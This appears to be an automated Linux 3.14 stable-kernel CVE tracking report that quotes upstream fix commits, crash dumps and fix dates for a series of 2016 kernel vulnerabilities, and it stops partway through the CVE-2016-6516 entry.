Description of fix for this vulnerability:
commit f024ee098476a3e620232e4a78cfac505f121245
Author: Paul Mackerras <paulus@ozlabs.org>
Date:   Wed Jun 22 14:21:59 2016 +1000

    KVM: PPC: Book3S HV: Pull out TM state save/restore into separate procedures
    
    This moves the transactional memory state save and restore sequences
    out of the guest entry/exit paths into separate procedures.  This is
    so that these sequences can be used in going into and out of nap
    in a subsequent patch.
    
    The only code changes here are (a) saving and restore LR on the
    stack, since these new procedures get called with a bl instruction,
    (b) explicitly saving r1 into the PACA instead of assuming that
    HSTATE_HOST_R1(r13) is already set, and (c) removing an unnecessary
    and redundant setting of MSR[TM] that should have been removed by
    commit 9d4d0bdd9e0a ("KVM: PPC: Book3S HV: Add transactional memory
    support", 2013-09-24) but wasn't.
    
    Cc: stable@vger.kernel.org # v3.15+
    Signed-off-by: Paul Mackerras <paulus@ozlabs.org>

 arch/powerpc/kvm/book3s_hv_rmhandlers.S |  449 ++++++++++++++++---------------
 1 file changed, 237 insertions(+), 212 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-5412
Break Date: 2014-03-29
Break Commit: e4e38121507a27d2ccc4b28d9e7fc4818a12c44c
Break Tag: 3.15
Linus Fix Date: 2016-07-28
Linus Commit: f024ee098476a3e620232e4a78cfac505f121245
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5696:
CVE-2016-5696:
CVE-2016-5696:
CVE-2016-5696:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.76.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 75ff39ccc1bd5d3c455b6822ab09e533c551f758
Author: Eric Dumazet <edumazet@google.com>
Date:   Sun Jul 10 10:04:02 2016 +0200

    tcp: make challenge acks less predictable
    
    Yue Cao claims that current host rate limiting of challenge ACKS
    (RFC 5961) could leak enough information to allow a patient attacker
    to hijack TCP sessions. He will soon provide details in an academic
    paper.
    
    This patch increases the default limit from 100 to 1000, and adds
    some randomization so that the attacker can no longer hijack
    sessions without spending a considerable amount of probes.
    
    Based on initial analysis and patch from Linus.
    
    Note that we also have per socket rate limiting, so it is tempting
    to remove the host limit in the future.
    
    v2: randomize the count of challenge acks per second, not the period.
    
    Fixes: 282f23c6ee34 ("tcp: implement RFC 5961 3.2")
    Reported-by: Yue Cao <ycao009@ucr.edu>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Suggested-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Acked-by: Yuchung Cheng <ycheng@google.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/ipv4/tcp_input.c |   15 ++++++++++-----
 1 file changed, 10 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-5696
Break Date: 2012-07-17
Break Commit: 282f23c6ee343126156dd41218b22ece96d747e3
Break Tag: 3.6
Linus Fix Date: 2016-07-11
Linus Commit: 75ff39ccc1bd5d3c455b6822ab09e533c551f758
Linus Tag: 4.7
Stable Date: 2016-08-16
Stable Commit: 860c53258e634c54f70252c352bae7bac30724a9
Stable Tag: 3.14.76

CVE-2016-5728:
CVE-2016-5728:
CVE-2016-5728:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5728:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9bf292bfca94694a721449e3fd752493856710f6
Author: Ashutosh Dixit <ashutosh.dixit@intel.com>
Date:   Wed Apr 27 14:36:05 2016 -0700

    misc: mic: Fix for double fetch security bug in VOP driver
    
    The MIC VOP driver does two successive reads from user space to read a
    variable length data structure. Kernel memory corruption can result if
    the data structure changes between the two reads. This patch disallows
    the chance of this happening.
    
    Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=116651
    Reported by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Sudeep Dutt <sudeep.dutt@intel.com>
    Signed-off-by: Ashutosh Dixit <ashutosh.dixit@intel.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/misc/mic/vop/vop_vringh.c |    5 +++++
 1 file changed, 5 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5728
Break Date: 2013-09-26
Break Commit: f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5
Break Tag: 3.13
Linus Fix Date: 2016-04-27
Linus Commit: 9bf292bfca94694a721449e3fd752493856710f6
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5828:
CVE-2016-5828:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5828:
CVE-2016-5828:
CVE-2016-5828:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 8e96a87c5431c256feb65bcfc5aec92d9f7839b6
Author: Cyril Bur <cyrilbur@gmail.com>
Date:   Fri Jun 17 14:58:34 2016 +1000

    powerpc/tm: Always reclaim in start_thread() for exec() class syscalls
    
    Userspace can quite legitimately perform an exec() syscall with a
    suspended transaction. exec() does not return to the old process, rather
    it load a new one and starts that, the expectation therefore is that the
    new process starts not in a transaction. Currently exec() is not treated
    any differently to any other syscall which creates problems.
    
    Firstly it could allow a new process to start with a suspended
    transaction for a binary that no longer exists. This means that the
    checkpointed state won't be valid and if the suspended transaction were
    ever to be resumed and subsequently aborted (a possibility which is
    exceedingly likely as exec()ing will likely doom the transaction) the
    new process will jump to invalid state.
    
    Secondly the incorrect attempt to keep the transactional state while
    still zeroing state for the new process creates at least two TM Bad
    Things. The first triggers on the rfid to return to userspace as
    start_thread() has given the new process a 'clean' MSR but the suspend
    will still be set in the hardware MSR. The second TM Bad Thing triggers
    in __switch_to() as the processor is still transactionally suspended but
    __switch_to() wants to zero the TM sprs for the new process.
    
    This is an example of the outcome of calling exec() with a suspended
    transaction. Note the first 700 is likely the first TM bad thing
    decsribed earlier only the kernel can't report it as we've loaded
    userspace registers. c000000000009980 is the rfid in
    fast_exception_return()
    
      Bad kernel stack pointer 3fffcfa1a370 at c000000000009980
      Oops: Bad kernel stack pointer, sig: 6 [#1]
      CPU: 0 PID: 2006 Comm: tm-execed Not tainted
      NIP: c000000000009980 LR: 0000000000000000 CTR: 0000000000000000
      REGS: c00000003ffefd40 TRAP: 0700   Not tainted
      MSR: 8000000300201031 <SF,ME,IR,DR,LE,TM[SE]>  CR: 00000000  XER: 00000000
      CFAR: c0000000000098b4 SOFTE: 0
      PACATMSCRATCH: b00000010000d033
      GPR00: 0000000000000000 00003fffcfa1a370 0000000000000000 0000000000000000
      GPR04: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR08: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR12: 00003fff966611c0 0000000000000000 0000000000000000 0000000000000000
      NIP [c000000000009980] fast_exception_return+0xb0/0xb8
      LR [0000000000000000]           (null)
      Call Trace:
      Instruction dump:
      f84d0278 e9a100d8 7c7b03a6 e84101a0 7c4ff120 e8410170 7c5a03a6 e8010070
      e8410080 e8610088 e8810090 e8210078 <4c000024> 48000000 e8610178 88ed023b
    
      Kernel BUG at c000000000043e80 [verbose debug info unavailable]
      Unexpected TM Bad Thing exception at c000000000043e80 (msr 0x201033)
      Oops: Unrecoverable exception, sig: 6 [#2]
      CPU: 0 PID: 2006 Comm: tm-execed Tainted: G      D
      task: c0000000fbea6d80 ti: c00000003ffec000 task.ti: c0000000fb7ec000
      NIP: c000000000043e80 LR: c000000000015a24 CTR: 0000000000000000
      REGS: c00000003ffef7e0 TRAP: 0700   Tainted: G      D
      MSR: 8000000300201033 <SF,ME,IR,DR,RI,LE,TM[SE]>  CR: 28002828  XER: 00000000
      CFAR: c000000000015a20 SOFTE: 0
      PACATMSCRATCH: b00000010000d033
      GPR00: 0000000000000000 c00000003ffefa60 c000000000db5500 c0000000fbead000
      GPR04: 8000000300001033 2222222222222222 2222222222222222 00000000ff160000
      GPR08: 0000000000000000 800000010000d033 c0000000fb7e3ea0 c00000000fe00004
      GPR12: 0000000000002200 c00000000fe00000 0000000000000000 0000000000000000
      GPR16: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR20: 0000000000000000 0000000000000000 c0000000fbea7410 00000000ff160000
      GPR24: c0000000ffe1f600 c0000000fbea8700 c0000000fbea8700 c0000000fbead000
      GPR28: c000000000e20198 c0000000fbea6d80 c0000000fbeab680 c0000000fbea6d80
      NIP [c000000000043e80] tm_restore_sprs+0xc/0x1c
      LR [c000000000015a24] __switch_to+0x1f4/0x420
      Call Trace:
      Instruction dump:
      7c800164 4e800020 7c0022a6 f80304a8 7c0222a6 f80304b0 7c0122a6 f80304b8
      4e800020 e80304a8 7c0023a6 e80304b0 <7c0223a6> e80304b8 7c0123a6 4e800020
    
    This fixes CVE-2016-5828.
    
    Fixes: bc2a9408fa65 ("powerpc: Hook in new transactional memory code")
    Cc: stable@vger.kernel.org # v3.9+
    Signed-off-by: Cyril Bur <cyrilbur@gmail.com>
    Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

 arch/powerpc/kernel/process.c |   10 ++++++++++
 1 file changed, 10 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5828
Break Date: 2013-02-15
Break Commit: bc2a9408fa65195288b41751016c36fd00a75a85
Break Tag: 3.9
Linus Fix Date: 2016-06-27
Linus Commit: 8e96a87c5431c256feb65bcfc5aec92d9f7839b6
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: ff19f63ed47309550b47831ac39176d9910fadfe
Stable Tag: 3.14.74

CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 93a2001bdfd5376c3dc2158653034c20392d15c5
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Thu Jun 23 08:59:47 2016 -0600

    HID: hiddev: validate num_values for HIDIOCGUSAGES, HIDIOCSUSAGES commands
    
    This patch validates the num_values parameter from userland during the
    HIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set
    to HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter
    leading to a heap overflow.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/usbhid/hiddev.c |   10 +++++-----
 1 file changed, 5 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5829
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-24
Linus Commit: 93a2001bdfd5376c3dc2158653034c20392d15c5
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: 22e658d19a1a64512d49de2632ad2124e6f9e429
Stable Tag: 3.14.74

CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.79.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Author: Martin Schwidefsky <schwidefsky@de.ibm.com>
Date:   Mon Apr 25 17:54:28 2016 +0200

    s390/sclp_ctl: fix potential information leak with /dev/sclp
    
    The sclp_ctl_ioctl_sccb function uses two copy_from_user calls to
    retrieve the sclp request from user space. The first copy_from_user
    fetches the length of the request which is stored in the first two
    bytes of the request. The second copy_from_user gets the complete
    sclp request, but this copies the length field a second time.
    A malicious user may have changed the length in the meantime.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com>
    Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

 drivers/s390/char/sclp_ctl.c |   12 +++++++-----
 1 file changed, 7 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-6130
Break Date: 2013-06-26
Break Commit: d475f942b1dd6a897dac3ad4ed98d6994b275378
Break Tag: 3.11
Linus Fix Date: 2016-04-27
Linus Commit: 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Linus Tag: 4.6
Stable Date: 2016-09-11
Stable Commit: 78a4260f1fad5cfc6ad7cf6e01a93a2fed0d0e3e
Stable Tag: 3.14.79

CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 43761473c254b45883a64441dd0bc85a42f3645c
Author: Paul Moore <paul@paul-moore.com>
Date:   Tue Jul 19 17:42:57 2016 -0400

    audit: fix a double fetch in audit_log_single_execve_arg()
    
    There is a double fetch problem in audit_log_single_execve_arg()
    where we first check the execve(2) argumnets for any "bad" characters
    which would require hex encoding and then re-fetch the arguments for
    logging in the audit record[1].  Of course this leaves a window of
    opportunity for an unsavory application to munge with the data.
    
    This patch reworks things by only fetching the argument data once[2]
    into a buffer where it is scanned and logged into the audit
    records(s).  In addition to fixing the double fetch, this patch
    improves on the original code in a few other ways: better handling
    of large arguments which require encoding, stricter record length
    checking, and some performance improvements (completely unverified,
    but we got rid of some strlen() calls, that's got to be a good
    thing).
    
    As part of the development of this patch, I've also created a basic
    regression test for the audit-testsuite, the test can be tracked on
    GitHub at the following link:
    
     * https://github.com/linux-audit/audit-testsuite/issues/25
    
    [1] If you pay careful attention, there is actually a triple fetch
    problem due to a strnlen_user() call at the top of the function.
    
    [2] This is a tiny white lie, we do make a call to strnlen_user()
    prior to fetching the argument data.  I don't like it, but due to the
    way the audit record is structured we really have no choice unless we
    copy the entire argument at once (which would require a rather
    wasteful allocation).  The good news is that with this patch the
    kernel no longer relies on this strnlen_user() value for anything
    beyond recording it in the log, we also update it with a trustworthy
    value whenever possible.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Paul Moore <paul@paul-moore.com>

 kernel/auditsc.c |  332 +++++++++++++++++++++++++++---------------------------
 1 file changed, 164 insertions(+), 168 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6136
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-07-20
Linus Commit: 43761473c254b45883a64441dd0bc85a42f3645c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 096cdc6f52225835ff503f987a0d68ef770bb78e
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Tue Jun 21 16:58:46 2016 +0300

    platform/chrome: cros_ec_dev - double fetch bug in ioctl
    
    We verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure
    that those values have not changed between the two copy_from_user()
    calls.  Otherwise it could lead to a buffer overflow.
    
    Additionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value.
    We should use the new smaller value so we don't copy too much data to
    the user.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Tested-by: Gwendal Grignou <gwendal@chromium.org>
    Cc: <stable@vger.kernel.org> # v4.2+
    Signed-off-by: Olof Johansson <olof@lixom.net>

 drivers/platform/chrome/cros_ec_dev.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6156
Break Date: 2015-06-15
Break Commit: a841178445bb72a3d566b4e6ab9d19e9b002eb47
Break Tag: 4.2
Linus Fix Date: 2016-07-05
Linus Commit: 096cdc6f52225835ff503f987a0d68ef770bb78e
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
4.5:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
4.5:
4.5:
CVE-2016-6187:
CVE-2016-6187:
2016-07-08:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Author: Vegard Nossum <vegard.nossum@oracle.com>
Date:   Thu Jul 7 13:41:11 2016 -0700

    apparmor: fix oops, validate buffer size in apparmor_setprocattr()
    
    When proc_pid_attr_write() was changed to use memdup_user apparmor's
    (interface violating) assumption that the setprocattr buffer was always
    a single page was violated.
    
    The size test is not strictly speaking needed as proc_pid_attr_write()
    will reject anything larger, but for the sake of robustness we can keep
    it in.
    
    SMACK and SELinux look safe to me, but somebody else should probably
    have a look just in case.
    
    Based on original patch from Vegard Nossum <vegard.nossum@oracle.com>
    modified for the case that apparmor provides null termination.
    
    Fixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a
    Reported-by: Vegard Nossum <vegard.nossum@oracle.com>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: John Johansen <john.johansen@canonical.com>
    Cc: Paul Moore <paul@paul-moore.com>
    Cc: Stephen Smalley <sds@tycho.nsa.gov>
    Cc: Eric Paris <eparis@parisplace.org>
    Cc: Casey Schaufler <casey@schaufler-ca.com>
    Cc: stable@kernel.org
    Signed-off-by: John Johansen <john.johansen@canonical.com>
    Reviewed-by: Tyler Hicks <tyhicks@canonical.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/apparmor/lsm.c |   36 +++++++++++++++++++-----------------
 1 file changed, 19 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6187
Break Date: 2016-01-04
Break Commit: bb646cdb12e75d82258c2f2e7746d5952d3e321a
Break Tag: 4.5
Linus Fix Date: 2016-07-08
Linus Commit: 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
